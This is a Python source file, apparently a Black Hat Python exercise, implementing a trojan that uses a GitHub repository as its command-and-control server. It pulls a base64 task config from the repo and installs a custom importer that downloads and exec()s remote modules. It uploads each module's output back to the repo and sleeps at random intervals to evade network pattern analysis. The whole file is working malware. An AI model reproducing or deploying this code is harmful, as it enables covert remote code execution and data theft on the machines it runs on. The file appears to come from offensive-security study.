import base64
import importlib.util
import github3
import importlib
import json
import random
import sys
import threading 
import time

from datetime import datetime

def github_connect(): # Reads github token
    with open('mytoken.txt') as f: # Write created token to mytoken file
        token = f.read().strip()
    user = 'AnLau25'
    sess = github3.login(token=token)
    return sess.repository(user, "bhptrojan")
    # Dif trojans require dif files, to control what each trojan does

def get_file_contents(dirname, module_name, repo): # Return contents to module
    return repo.file_contents(f'{dirname}/{module_name}').content

class Trojan:
    # Init trojan
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/' # where to write output file
        self.repo = github_connect()
        
    def get_config(self): # Retreive remote config document 
        config_json = get_file_contents(
            'config', self.config_file, self.repo
        )
        config = json.loads(base64.b64decode(config_json))
        
        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        
        return config
     
    def module_runner(self, module): # Call run functin from imported module
        result = sys.modules[module].run()
        self.store_module_result(result)
    
    def store_module_result(self, data): # Create file for output with name current date-time 
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = bytes('%r' % data, 'utf-8')
        self.repo.create_file(remote_path, message, base64.b64encode(bindata))
    
    def run(self):
        while True:
            config = self.get_config() # Grab congig from repo
            for task in config: # Kick off module with thread
                thread = threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],)
                ) # Call modules run function
                thread.start()
                time.sleep(random.randint(1, 10))
                
            time.sleep(random.randint(30*60, 3*60*60)) 
            # Sleep for x amount of time to foil network patern analisys

class GitImporter:
    def __init__(self):
        self.current_module_code = ""
    
    def find_module(self, name, path = None): # attempt to locate mod
        print("[*] Attempting to retrive %s" % name)
        self.repo = github_connect()
        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        
        if new_library is None:
            return None
        
        if new_library is not None: # If found, pass to remote file loader
            self.current_module_code = base64.b64decode(new_library)
            return self
    
    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec) # New balk module obj
        exec(self.current_module_code, new_module.__dict__) # shovel code retreived from github
        sys.modules[spec.name] = new_module # insert new module to sys module list
        return new_module
    
if __name__ == '__main__':
    sys.meta_path.append(GitImporter()) # Create trojan obj
    trojan = Trojan('abc')
    trojan.run()        